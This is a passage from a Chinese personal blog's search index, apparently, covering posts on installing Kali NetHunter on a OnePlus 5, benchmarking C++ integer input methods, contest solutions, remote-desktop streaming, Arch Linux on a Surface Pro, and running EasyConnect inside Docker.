零基础到搓出一个ItemRacing插件, 那我就得赶紧从梦里醒来了. 而今, 在 AI 的加持下, 我真正做到了 “不会编程” 也能搓出一个项目, 如果后期Gemini没有罢工, 或者我一开始就选择了比Gemini更强力的工具(肯定是有的), 那做到 “一行代码都不写” 就实现一个功能复杂的插件恐非不可能之事. 一方面有 AI 这样的得力助手强势加持开发, 毫无疑问会大大简化不少繁琐复杂的工作, 另一方面 AI 如此大幅降低开发的门槛, 我这样码力低下的菜狗恐怕得做好随时被淘汰的觉悟了 QAQ .\n接着聊聊这个项目.\n我自己认为, 这个项目算是挺成功的, 抛开代码质量不谈 (因为我也看不出代码质量如何), 至少插件在经过Gemini的框架构建以及我的修修补补后, 是能够正常工作的, 游戏内容也完全符合我的预期.\n当然, 对于资深开发者来说, 用 taboolib 这样的轮子或许能轻松搞定这些功能, 这样的游戏插件完全不值一提. 但对我而言, 此次开发的收获, 远远不止一个能运行的插件. (这意味着我的黑历史要++了)\n尽管这个项目不管是技术上还是创意上都没有任何惊天动地的创新, 但它是我的第一个大作业, 也是第一个较为完整的作品项目, 所以我决定将它开源, 或许真有人喜欢这个小游戏插件呢?\n项目地址: https://github.com/Coast23/ItemRacing\nAnyway, 如果你喜欢这个项目, 欢迎 Star⭐ 或者 Fork, 也欢迎大家呼朋唤友来帮忙找bug玩. 如果发现了BUG(包有的), 请提交Issue, 我会尽我所能修复.\n","categories":["开发"]},{"title":"Kali NetHunter 安装过程记录","url":"/2025/06/20/Kali-NetHunter-%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","content":"前言因为在忙期中期末考, 好久没写博文了. 久违地更一下.\n几天前在浏览小黄鱼的时候, 发现居然有 Kali NetHunter 这样的好东西, 可以在安卓设备上安装 Kali.\n之前确实有搞一个便携式 Kali 的想法, 也去尝试了, 那就是把 Kali Live 安装到 SD 卡 (为什么不用 U 盘呢? 因为不想外接一个拓展坞)上, 然后在 Surface 上使用. 但试过多种方法都无法让 Surface 启动 SD 卡中的系统, 遂放弃.\n现在知道可以在 Android 手机上安装 Kali, 这样的玩具我肯定是要整一个来玩玩的.\n根据官方文档, NetHunter 有这么  个版本:\n\n\n\nEdition\nUsage\n\n\n\nNetHunter Rootless\nThe core of NetHunter for unrooted, unmodified devices\n\n\nNetHunter Lite\nThe full NetHunter package for rooted phones without a custom kernel\n\n\nNetHunter\nThe full NetHunter package with custom kernel for supported devices\n\n\n我想玩 Full NetHunter, 在浏览了官方文档、了解支持的设备列表、在小黄鱼上精挑细选后, 我最终怒斥 280 RMB 入手了一台 OnePlus 5 (说实话有点亏, 不在意成色的话能用更便宜的价格买到更好的设备), 用它来安装 NetHunter.\n然后这篇文章就是安装过程的简单记录. 由于这是我第一次给 Android 手机刷机, 所以踩了不少坑. 还好最终还是成功了.\n在 OnePlus 5 安装 NetHunter 可以分为四步:\n\n下载所需资源\n安装 LineageOS 20\n获取 Root\n安装 NetHunter\n\n参考文档:\nInstalling NetHunter on the OnePlus 5T 总体流程跟着这篇文档走.\nInstall LineageOS on OnePlus 5 LineageOS 的安装可参考这篇 wiki.\n\n下载所需资源1. Kali NetHunter 选择对应手机型号的文件.\n2. Android SDK Platform-Tools (可能需要魔法)\n3. Google USB Driver\n下载解压, 右键 .inf 文件安装.\n\n4. LineageOS (选择对应的手机型号下载 zip 文件, 我这里是 OnePlus 5, 所以下载的是 lineage-22.2-20250616-nightly-cheeseburger-signed.zip) 把压缩包里的 recovery.img 解压到 Platform-Tools 目录里, 后面会用到.\n4. LineageOS 20下载 lineage-20.0-20230313-nightly-cheeseburger-signed.zip. 下载后, 建议提前将压缩包内的 recovery.img 和 boot.img 这两个文件解压出来,放到 Platform-Tools 目录里备用. 后面刷写 Recovery 和获取 Root 权限时会用到.\n(上面划掉的部分是怎么回事? 因为我图省事直接装了最新的 LineageOS 22 (Android 15), 然后在装了 NetHunter 后开机直接不进系统, 还好有装 TWRP, 进 Recovery mode 重新刷成了 LineageOS 20, 不然真 GG 了.)\n总之, NetHunter 不支持 LineageOS 22, 必须用 LineageOS 20.\n5. Magisk 面具, 先下载, 后面要安装到手机上.6. TWRP 卡刷, 救砖神器, 下载放到 Platform-Tools 目录里.\n安装 LineageOS总体按照 官方wiki 操作即可.\n如果是像我一样第一次刷机, 建议先读一读这篇文章, 了解学习各个命令的含义, 刷机过程一定要明白自己的每一步是在做什么!\n以下是我的操作过程.\n开启 OEM 解锁和 USB 调试手机原系统 (我这里是氢OS) 要启用开发者选项. (设置 -&gt; 关于手机 -&gt; 点击版本号 7次)然后, 开启 OEM解锁 和 USB调试. (设置 -&gt; 系统 -&gt; 开发者选项 -&gt; 启用OEM解锁和USB调试)\n使用 USB 数据线将手机连接到电脑, 手机上会弹出 “是否允许 USB 调试?” 的窗口, 勾选 “一律允许”, 然后点击 “确定”.\n在 adb.exe 所在目录打开终端, 键入命令 adb -d reboot bootloader.\n电脑安装驱动手机是成功进入了 fastboot mode, 但 fastboot devices 命令没有任何输出. (有输出就跳过这一步)\n第一反应就是驱动问题, 在设备管理器里找到手机设备:\n\n右键, 更新驱动程序 -&gt; 浏览我的电脑以查找驱动程序 -&gt; 让我从计算机上的可用驱动程序列表中选取,\n选择 Android Device, 然后 3 个随便选一个安装应该都行, 我选的第一个.\n解 BL 锁并写入 recovery 镜像驱动安装后, 再次在终端输入 fastboot devices, 出现了 4f59d058        fastboot 这样的输出, 便可以继续下一步了.\n输入 fastboot oem unlock, 手机出现警告信息, 用音量键选择 UNLOCK THE BOOTLOADER, 按电源键确认选择. 然后等待手机重启(重置). 大概要等 5 分钟.\n(注意, 上面这一步会清空手机所有数据, 所以如果手机里有重要数据, 请先备份.)\n手机重启后, 在设置里重新启用 USB 调试.\n然后在终端输入 adb -d reboot bootloader 进入 fastboot mode, 并输入 fastboot devices 确认设备连接成功.\n执行 fastboot flash recovery recovery.img 写入 recovery 镜像.\n安装系统写入 recovery 后, 用音量键选择 recovery mode, 按电源键确认选择. 然后等待手机重启进入 recovery 界面.\n选择 Apply update -&gt; Apply from ADB, 然后在终端输入 adb -d sideload &lt;zip路径&gt;, 比如我这里是:\nadb -d sideload \"I:\\lineage-20.0-20230313-nightly-cheeseburger-signed.zip\"\n\n然后等待安装完成即可.\n安装完成后, 选择 Reboot system now. (你也可以按照官网wiki去安装 google-apps, 我这里跳过了因为我用不到.)\n还是建议装一下 Google Apps, NetHunter 里有些软件可能用得到.\n到  选择对应的版本下载. (OnePlus 5 是 arm64)\n再次选择 Apply from ADB.\n然后 adb -d sideload &lt;zip路径&gt;.\n如果重启报错, 选择那个 Format data 一会儿后就能进入系统了.\n进入系统, 设置 -&gt; 系统更新 -&gt; 右上角三个点 -&gt; 首选项 -&gt; 自动检查更新 设为 永不.\n至此, LineageOS 安装完成.\n\n获取 Root下拉菜单, 通知里找到 正在通过 USB 为此设备充电 这条通知, 点击, 查看更多选项, 勾选 文件传输.\n将之前从 LineageOS 压缩包 里解压出来的 boot.img, 以及 Magisk 的 .apk 安装包, 一同传输到手机的存储中, 然后安装 Magisk, 在 Magisk 中点击 安装 -&gt; 选择并修补一个文件 -&gt; 选择 boot.img -&gt; 点击 开始→.\n注: 如果发现在手机上无法安装, 可以用 adb install &lt;电脑上 Magisk 的路径&gt; 进行安装.\n等看到 All done! 后, 把 boot.img 同目录下生成的 magisk_patched-29000_gJZgQ.img (类似这个名字) 拷贝到电脑上的 Platform-Tools 目录里备用.\n然后, 拔下 USB 线, 手机关机. 再按住音量+ 键与电源键进入 fastboot mode, 插上 USB 线. (kali文档是这么写的我就这么做了)\n终端输入 fastboot devices 确认设备已连接, 然后输入 fastboot flash recovery twrp-3.7.1_12-2-cheeseburger_dumpling.img 刷入 TWRP (文件名改成你的 TWRP 文件).\n(TIP: 当然也可以不刷 TWRP, 而是直接把 *patched*.img 刷到 boot 分区上, 不过我还是老老实实地刷了 TWRP, 没有它的话我估计很难救砖.)\n然后, 手机用音量键选择 Recovery mode, 按下电源键进入 TWRP. 向右滑 Swipe to allow modifications 滑动条, 点击 Install, 点击右下角 Install Image, 找到刚刚 Magisk 生成的 magisk_patched-29000_gJZgQ.img (类似这个名字), 选择 Boot 分区, 向右滑滑动条. 烧录完成后, Reboot system.\n重启手机, (如果遇到红色感叹号提示, 不用管它, 按电源键跳过即可) 打开 Magisk, 如果能进入 超级用户 和 模块 选项, 说明 Root 成功.\n\n安装 Kali NetHunter把 kali-nethunter-2025.2-oneplus5-los-thirteen-full.zip 传到手机上, 打开 Magisk, 选择 模块, 安装该 zip 即可.\n可能要等比较长的时间.\n安装完成后, 点击 “重启”.\n如果能进入系统, 且桌面从下往上滑打开抽屉能看到 NetHunter 相关应用, 说明安装成功.\n至此, Kali NetHunter 安装完成.\n","tags":["Kali"]},{"title":"OI各整数读入方式速度比较","url":"/2025/01/24/OI%E5%90%84%E6%95%B4%E6%95%B0%E8%AF%BB%E5%85%A5%E6%96%B9%E5%BC%8F%E9%80%9F%E5%BA%A6%E6%AF%94%E8%BE%83/","content":"某天, 我突然对OI常用的整数读入方式的速度感到好奇, 于是决定写个程序测试一下.\n测试的读入方式有:\n1. scanf2. 快读(read)3. 快读(fread)4. cin5. cin.tie(0)后的cin6. 取消流同步后的cin\n测试程序char buf[1 &lt;&lt; 23], *p1 = buf, *p2 = buf, obuf[1 &lt;&lt; 23], *O = obuf;#include &lt;bits/stdc++.h&gt;using namespace std;using namespace chrono;int x;int N = 20000000; // 测试数据量, 这里是2e7int read() &#123;    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == &#x27;-&#x27;);    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;&#125;void gen(int n)&#123;    srand(time(0));    FILE *fp = fopen(&quot;test.in&quot;, &quot;w&quot;);    for(int i = 0; i &lt; n; ++i)&#123;        int opt = rand() % 2;        if(opt) fprintf(fp, &quot;%d &quot;, rand());        else fprintf(fp, &quot;%d &quot;, -rand());    &#125;    fclose(fp);&#125;void test_read(int n)&#123;while(n--) x = read();&#125;void test_scanf(int n)&#123;while(n--) scanf(&quot;%d&quot;, &amp;x);&#125;void test_cin(int n)&#123;while(n--) cin &gt;&gt; x;&#125;int main()&#123;    #pragma region 预生成随机数    gen(N);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试scanf    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    auto start = high_resolution_clock::now();    test_scanf(N);    auto end = high_resolution_clock::now();    printf(&quot;scanf: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试read    #undef getchar    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    start = high_resolution_clock::now();    test_read(N);    end = high_resolution_clock::now();    printf(&quot;read function: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试fread    #define getchar() (p1==p2&amp;&amp;(p2=(p1=buf)+fread(buf,1,1&lt;&lt;21,stdin),p1==p2)?EOF:*p1++)    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    start = high_resolution_clock::now();    test_read(N);    end = high_resolution_clock::now();    printf(&quot;fread function: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #undef getchar    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试cin    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    start = high_resolution_clock::now();    test_cin(N);    end = high_resolution_clock::now();    printf(&quot;cin: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试untied cin    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    ios::sync_with_stdio(true);    cin.tie(nullptr);    start = high_resolution_clock::now();    test_cin(N);    end = high_resolution_clock::now();    printf(&quot;untied cin: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试unsync cin    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    ios::sync_with_stdio(false);    start = high_resolution_clock::now();    test_cin(N);    end = high_resolution_clock::now();    printf(&quot;unsync cin: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    ////////////////////////////////////////////////////////////////////////    #pragma region 测试fastest cin    freopen(&quot;test.in&quot;, &quot;r&quot;, stdin);    ios::sync_with_stdio(false);    cin.tie(nullptr);    start = high_resolution_clock::now();    test_cin(N);    end = high_resolution_clock::now();    printf(&quot;fastest cin: %d ms\\n&quot;, duration_cast&lt;milliseconds&gt;(end - start).count());    fclose(stdin);    #pragma endregion    return 0;&#125;\n\n\nWindows11 MinGW-W64测试结果\n    测试环境 \n    \n      CPU: Intel(R) Core(TM) i9-14900HX   2.20 GHz\nRAM: 32 GB\n编译器信息:\n$ g++ -vUsing built-in specs.COLLECT_GCC=g++COLLECT_LTO_WRAPPER=C:/mingw64/bin/../libexec/gcc/x86_64-w64-mingw32/8.1.0/lto-wrapper.exeTarget: x86_64-w64-mingw32Configured with: ../../../src/gcc-8.1.0/configure --host=x86_64-w64-mingw32 --build=x86_64-w64-mingw32 --target=x86_64-w64-mingw32 --prefix=/mingw64 --with-sysroot=/c/mingw810/x86_64-810-win32-seh-rt_v6-rev0/mingw64 --enable-shared --enable-static --disable-multilib --enable-languages=c,c++,fortran,lto --enable-libstdcxx-time=yes --enable-threads=win32 --enable-libgomp --enable-libatomic --enable-lto --enable-graphite --enable-checking=release --enable-fully-dynamic-string --enable-version-specific-runtime-libs --disable-libstdcxx-pch --disable-libstdcxx-debug --enable-bootstrap --disable-rpath --disable-win32-registry --disable-nls --disable-werror --disable-symvers --with-gnu-as --with-gnu-ld --with-arch=nocona --with-tune=core2 --with-libiconv --with-system-zlib --with-gmp=/c/mingw810/prerequisites/x86_64-w64-mingw32-static --with-mpfr=/c/mingw810/prerequisites/x86_64-w64-mingw32-static --with-mpc=/c/mingw810/prerequisites/x86_64-w64-mingw32-static --with-isl=/c/mingw810/prerequisites/x86_64-w64-mingw32-static --with-pkgversion=&#x27;x86_64-win32-seh-rev0, Built by MinGW-W64 project&#x27; --with-bugurl=https://sourceforge.net/projects/mingw-w64 CFLAGS=&#x27;-O2 -pipe -fno-ident -I/c/mingw810/x86_64-810-win32-seh-rt_v6-rev0/mingw64/opt/include -I/c/mingw810/prerequisites/x86_64-zlib-static/include -I/c/mingw810/prerequisites/x86_64-w64-mingw32-static/include&#x27; CXXFLAGS=&#x27;-O2 -pipe -fno-ident -I/c/mingw810/x86_64-810-win32-seh-rt_v6-rev0/mingw64/opt/include -I/c/mingw810/prerequisites/x86_64-zlib-static/include -I/c/mingw810/prerequisites/x86_64-w64-mingw32-static/include&#x27; CPPFLAGS=&#x27; -I/c/mingw810/x86_64-810-win32-seh-rt_v6-rev0/mingw64/opt/include -I/c/mingw810/prerequisites/x86_64-zlib-static/include -I/c/mingw810/prerequisites/x86_64-w64-mingw32-static/include&#x27; LDFLAGS=&#x27;-pipe -fno-ident -L/c/mingw810/x86_64-810-win32-seh-rt_v6-rev0/mingw64/opt/lib -L/c/mingw810/prerequisites/x86_64-zlib-static/lib -L/c/mingw810/prerequisites/x86_64-w64-mingw32-static/lib &#x27;Thread model: win32gcc version 8.1.0 (x86_64-win32-seh-rev0, Built by MinGW-W64 project)\n    \n  \n\n\n\n\n排名\n读入方式\n用时\n\n\n\n1\nfastest cin\n1707ms\n\n\n2\nunsync cin\n1763ms\n\n\n3\nfread\n1909ms\n\n\n4\nread\n1985ms\n\n\n5\nscanf\n5214ms\n\n\n6\ncin\n11080ms\n\n\n7\nuntied cin\n11425ms\n\n\n\nArchLinux GCC测试结果\n    测试环境 \n    \n      CPU: Intel(R) Core(TM) i5-7300U   3.50 GHzRAM: 8 GB\n编译器信息:\n$ g++ -vUsing built-in specs.COLLECT_GCC=g++COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-pc-linux-gnu/14.2.1/lto-wrapperTarget: x86_64-pc-linux-gnuConfigured with: /build/gcc/src/gcc/configure --enable-languages=ada,c,c++,d,fortran,go,lto,m2,objc,obj-c++,rust --enable-bootstrap --prefix=/usr --libdir=/usr/lib --libexecdir=/usr/lib --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=https://gitlab.archlinux.org/archlinux/packaging/packages/gcc/-/issues --with-build-config=bootstrap-lto --with-linker-hash-style=gnu --with-system-zlib --enable-__cxa_atexit --enable-cet=auto --enable-checking=release --enable-clocale=gnu --enable-default-pie --enable-default-ssp --enable-gnu-indirect-function --enable-gnu-unique-object --enable-libstdcxx-backtrace --enable-link-serialization=1 --enable-linker-build-id --enable-lto --enable-multilib --enable-plugin --enable-shared --enable-threads=posix --disable-libssp --disable-libstdcxx-pch --disable-werrorThread model: posixSupported LTO compression algorithms: zlib zstdgcc version 14.2.1 20240910 (GCC)\n    \n  \n\n\n\n\n排名\n读入方式\n用时\n\n\n\n1\nread\n1516ms\n\n\n2\nfread\n1592ms\n\n\n3\nfastest cin\n2480ms\n\n\n4\nunsync cin\n2485ms\n\n\n5\nscanf\n2800ms\n\n\n6\nuntied cin\n8662ms\n\n\n7\ncin\n9098ms\n\n\n\n总结Windows MinGW-W64下, 读入速度 关闭流同步cin &gt; fread ≈ read &gt; scanf &gt; cin.\nArchLinux GCC下, 读入速度 read ≈ fread &gt; 关闭流同步cin &gt; scanf &gt; cin.\n","categories":["算法"],"tags":["读入"]},{"title":"Operator Precedence","url":"/2025/01/13/Operator-Precedence/","content":"XCPC 寒假集训班 D1 练习题 E题题目描述\n个人解答题目不允许出现因子0, 那就配凑1, 尝试把除首项和末项外的因子全部配成1.\n很容易想到构造:\n\n这样一来, 题目的式子就变成了:\n\n直接令  , 可以解出\n\n于是我们就得到了这样一个合法的构造:\n共组\n做完了.\nAC Code:\n#include &lt;cstdio&gt;int T, n;int main(){    scanf(\"%d\", &amp;T);    while(T--){        scanf(\"%d\", &amp;n);        printf(\"%d \", (n-2) &lt;&lt; 1 | 1);        for(int i = 1; i &lt; n; ++i) printf(\"2 -1 \");        printf(\"1\\n\");    }    return 0;}","categories":["算法"],"tags":["构造"]},{"title":"Sunshine+Moonlight实现远程操控电脑","url":"/2025/03/08/Sunshine-Moonlight%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%93%8D%E6%8E%A7%E7%94%B5%E8%84%91/","content":"背景对大学生而言, 笔电是必不可少的生产力工具.\n但我的本子是游戏本, 有着 2.4kg+ 的重量、厚重的机身、垃圾的续航, 外出使用非常不方便.\n于是, 我怒斥 500r 购入了一台 N 手的、安装了ArchLinux的Surface Pro 5, 作为我的备用机.\n尽管如此, 还是偶尔有需要远程操控主力机的需求, 现成的方案有不少, 比如SSH, VNC, RDP等, 但它们都有着明显的缺点:\n\nSSH: 没有图形化界面.\nVNC: 卡得离谱, 用不了一点.\nRDP: 比VNC好, 但延迟和流畅度仍然差强人意.\n\n直到我发现了Sunshine+Moonlight这套解决方案, 这套为游戏串流而生的应用几乎能完美解决我的需求. 极低的延迟, 丝滑的流畅度, 不管是写代码还是browse网页, 都有着非常舒适的体验.\n简单记录一下安装和使用过程.\n需要的工具:\n\n一台有N卡的主机 (其它显卡应该也行)\n一台客户端设备, 比如带蓝牙键盘的平板\nSunshine (服务端): 官网 | 下载页\nMoonlight (客户端): 官网 | 下载页\n\n\n安装服务端PC上安装并运行Sunshine, 在https://localhost:47990/进行配置.\n\n设置好管理员账号密码, 登录后可能会看到这样的界面:\n\nViGEmBus的下载地址: https://github.com/nefarius/ViGEmBus/releases\n安装后重启Sunshine.\n后台基本没什么需要设置的. 如果不习惯英文, 你可以在 Configure 页把语言改为简中.\n如果要ipv6 + DDNS, 可能还需要在Network处设置ipv4 + ipv6.\n保证Sunshine在后台运行就行了.\n注意, 绝大部分笔记本都不支持WoL, 所以, 为了随时连上服务端, 需要在电源计划中把 自动休眠&#x2F;睡眠 关了, 包括合盖休眠.\n\n客户端下载安装Moonlight, 添加PC的IP地址, 在服务端的后台输入PIN码进行配对, 并设置客户端名称. 然后就可以愉快地远程操控PC了.\n设置里可以改视频分辨率、帧数、视频码率. 如果出现卡顿的话就调低一点.\n\n[可选] 远程解锁有个问题, 如果服务端锁屏了, 那么, 虽然能够使用Moonlight连接, 但PC的密码输入界面是无法传输到客户端的, 客户端按键盘输入密码是没用的.\n解决方法有2个, 最简单的就是关掉自动锁屏, 不过我选择的是远程解锁.\n用到的工具在这.\n服务端安装一个远程指纹解锁模块, 服务端(或者手机)在酷安上搜索安装远程解锁.\n\n不用理会这个提示, 点取消就行了.\n\n一样地, 添加服务端的IP地址, 添加用户(PC的用户名和密码), 然后就可以愉快地远程解锁PC了.\n","categories":["杂项"],"tags":["资源分享"]},{"title":"Surface Pro 安装 Archlinux 注意事项","url":"/2025/05/29/Surface-Pro-%E5%AE%89%E8%A3%85-Archlinux-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","content":"\n安装总体流程与我的另一篇文章基本一致, 只是不需要安装 Nvidia 显卡驱动.\n\n安装后输入 nmcli device show, 没有看到 wifi 设备, 输入 lspci -knn | grep -iA3 net 发现网卡是 Marvell 88W8897 [AVASTAR], 因此在 USB 安装介质中需要额外安装 linux-firmware-marvell 包.\n\n安装完成后, 如果想要使用触摸屏、按键等, 需要更换内核, 参考 linux-surface 的 Installation Guide.\n\n\n添加 key:\ncurl -s https://raw.githubusercontent.com/linux-surface/linux-surface/master/pkg/keys/surface.asc \\    | sudo pacman-key --add -\n\n签名:\nsudo pacman-key --lsign-key 56C464BAAC421453\n\n将以下内容添加到 /etc/pacman.conf:\n[linux-surface]Server = https://pkg.surfacelinux.com/arch/\n\n同步:\nsudo pacman -Syu\n\n安装内核:\nsudo pacman -S linux-surface linux-surface-headers iptsd\n\n添加引导项, 由于我使用的是 systemd-boot 而非 grub, 因此与官方 wiki 不同.\n创建 /boot/loader/entries/surface.conf (可参考同目录下的 arch.conf, 最后一行直接抄就行):\ntitle   Surface Linuxlinux   /vmlinuz-linux-surfaceinitrd  /intel-ucode.imginitrd  /initramfs-linux-surface.imgoptions root=PARTUUID=&lt;你的root分区PARTUUID&gt; rw rootflags=subvol=@,compress=zstd\n\n编辑 /boot/loader/loader.conf, 将 surface 设为首选项:\ndefault surfacetimeout 5editor no\n\nreboot 后, 应该就能正常进入系统了, 且触摸屏和按键等可正常使用.\n可通过 uname -a 判断是否使用了 linux-surface 内核.\n","tags":["Arch"]},{"title":"Windows下使用Docker封印EasyConnect","url":"/2025/03/01/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8Docker%E5%B0%81%E5%8D%B0EasyConnect/","content":"前言学校使用深信服的EasyConnect作为外网访问校园内网资源的SSL VPN客户端. 但众所周知EasyConnect是个流氓软件, 不仅极难卸载干净, 而且有很高的系统权限, 指不定会收集隐私信息. 好在Github上有大佬提供了docker-easyconnect, 可以把EasyConnect封印在Docker容器中, 并提供代理供主机使用. 该项目的README非常详尽, 这里简单记录一下我的封印过程.\n\n  \n    卸载EasyConnect的方式详见我的另一篇文章: &ensp;&ensp; 完美卸载EasyConnect &#x2F; Sangfor VPN \n\n  \n\n获取必要的工具\nDocker: 选择合适的版本安装即可. 安装完成后, 通过命令行运行 docker --version 验证是否安装成功.\nDocker-EasyConnect: 项目地址, 参照其README使用.\nVNC Viewer: 远程桌面客户端, 用于访问容器中的EasyConnect, 进行登录.\nProxy SwitchyOmega: 浏览器代理工具, 可以方便地开关代理.\n\n部署拉取镜像终端键入 (需要先启动Docker):\ndocker run --rm --device /dev/net/tun --cap-add NET_ADMIN -ti -e PASSWORD=114514 -e URLWIN=1 -v $HOME/.ecdata:/root -p 127.0.0.1:5901:5901 -p 127.0.0.1:1080:1080 -p 127.0.0.1:8888:8888 hagb/docker-easyconnect:7.6.7\n\n解释一下各个参数:\ndocker run \\  --rm \\                         # 容器退出时自动删除(临时 VPN 连接, 不会持久化)  --device /dev/net/tun \\        # 允许容器访问 TUN 设备, 以支持 VPN 隧道 (将主机的 /dev/net/tun 映射给容器)  --cap-add NET_ADMIN \\          # 赋予容器修改网络配置的权限 (配置 VPN)  -ti \\                          # 交互模式运行, 允许用于在终端与容器交互  -e PASSWORD=114514 \\           # VNC连接时的密码 (不是VPN的密码!!!)  -e URLWIN=1 \\                  # 启用 Web UI（管理 VPN）  -v $HOME/.ecdata:/root \\       # 挂载主机目录 $HOME/.ecdata 到容器的 /root 目录, 用于持久化数据 (储存配置信息, 用户token, CA证书等)  -p 127.0.0.1:5901:5901 \\       # 将容器的 5901 (第二个) 端口映射到主机的 5901 (第一个) 端口. 5901是 VNC Server的默认端口.  -p 127.0.0.1:1080:1080 \\       # 同上. 1080 是 Socks5 代理的默认端口  -p 127.0.0.1:8888:8888 \\       # 同上. 8888 是 HTTP 代理的默认端口  hagb/docker-easyconnect:7.6.7  # Docker 镜像.\n\n根据需求更改命令. 比如修改PASSWORD和各个端口映射.\n第一次运行时会拉取镜像, 需要等待一段时间. (可能会下载失败, 看脸. 我是拉取下来了, 拉不下来就去换源吧)\n\n然后, 打开VNC Viewer, 地址栏输入127.0.0.1:5901 (你选择的VNC Server映射端口), 密码是上面的PASSWORD的值.\n\n不出意外的话, 就能看到熟悉的软件界面了.\n\n这里的Server Address填学校提供的地址, 然后登录.\n配置Proxy SwitchyOmega其实我一开始是想用Clash, 但失败了, 配置之后能ping得通, 但就是访问不了, 遂放弃. 改成使用浏览器代理插件.\n下载SwitchyOmega. 我是Chromium内核的浏览器, 所以下载.crx文件.\n如果浏览器能直接安装crx文件, 就直接安装. 否则用压缩包解压到一个空文件夹里, 浏览器扩展界面开启开发者模式并加载已解压的扩展程序, 选择刚刚解压的文件夹, 安装扩展.\n打开扩展设置, 新建情景模式, 取个喜欢的名字.\n\n然后填写代理信息, SOCKS5 或 HTTP 都行, 端口要和 Docker 的映射端口相对应. 填完后点击应用选项.\n\n以后访问校内网站时, 点击扩展图标, 选择对应的代理即可.\n\n完结撒花!","categories":["杂项"],"tags":["资源分享"]},{"title":"XCPC 寒假集训班 D2 个人笔记","url":"/2025/01/15/XCPC-%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD%E7%8F%AD-D2-%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/","content":"讲评题魔法阵传送门\n首先, 可以直接枚举 , , ,  , 然后判断是否满足题目所给条件. 时间复杂度 .\n注意到题目的条件  , 利用这个条件我们可以少枚举一维:\n置\n则\n枚举  , 然后  和  中只要枚举一个就能确定对方,  和  同理, 这样我们就只需要枚举三个变量, 时间复杂度降低为  .\n再来看这个奇怪的约束条件:\n把  代入:\n\n把  ,  换成  ,  , 可以估出  的范围:\n\n即:\n\n回到上面这个式子:\n\n哎, 这是个大于号, 不是等于号? 看着很烦?\n那就把它变成:\n\n或者:\n\n这些关系用数轴表示更直观:\n\n看起来, 似乎仍然要枚举  ,  , 四个变量中的一个, 总共3个变量, 才能确定所有数?\n并非如此!\n注意到这样一个性质:\n较小的  所确定出的  , 在  增大的时候也能使  成立.\n也就是说, 随着  的增加, 符合要求的  的集合是只增不减的.\n这个性质非常重要, 这意味着我们只需要枚举  和  , 并在枚举  的时候累计合法的  的数量, 就能够统计  和  的答案数了.\n时间复杂度  . 常数比较小, 可以通过此题.\n/*cnt[x]: x的出现次数ans[x][p] (p = 1,2,3,4): x数作为a,b,c,d的答案数.*/for(int k = 1; k * 9 &lt; n; ++k){ // 枚举k.     int sum = 0; // 统计合法的a的数量    for(int d = 9 * k + 2; d &lt;= n; ++d){ // 枚举d        int a = d - 9 * k - 1, b = a + 2 * k, c = d - k; // 计算a, b, c        /*        解释一下为什么a = 9 * k - 1, 因为d+1后, 只有d - 9 * k - 1进入新的解集. 或者说, 一开始我们就令t = 1了.        */        sum += cnt[a] * cnt[b]; // 计算合法的X_a 和 X_b数对        ans[c][3] += sum * cnt[d]; // sum乘上d的个数就是c作为X_c的答案数        ans[d][4] += sum * cnt[c]; // sum乘上c的个数就是d作为X_d的答案数    }}\n\n同理, 较小的  所确定出的  , 在  减小的时候也能使  成立.\n通过枚举  和  . 来确定  和  的答案数. 注意  这里是逆序枚举了.\nfor(int k = 1; k * 9 &lt; n; ++k){    int sum = 0;    for(int a = n - 9 * k - 1; a; --a){        int b = a + 2 * k, d = 9 * k + 1, c = d - k;        sum += cnt[c] * cnt[d];        ans[a][1] += sum * cnt[b];        ans[b][2] += sum * cnt[a];    }}\n\n完整代码:\n#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 50005int n, m;int x[N], cnt[N];int ans[N][5];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int main(){    n = read(), m = read();    for(int i = 1; i &lt;= m; ++i) x[i] = read(), ++cnt[x[i]];    for(int k = 1; k * 9 &lt; n; ++k){        int sum = 0;        for(int d = 9 * k + 2; d &lt;= n; ++d){            int a = d - 9 * k - 1, b = a + 2 * k, c = d - k;                    sum += cnt[a] * cnt[b];            ans[c][3] += sum * cnt[d];            ans[d][4] += sum * cnt[c];         }        sum = 0;        for(int a = n - 9 * k - 1; a; --a){            int b = a + 2 * k, d = a + 9 * k + 1, c = d - k;                    sum += cnt[c] * cnt[d];            ans[a][1] += sum 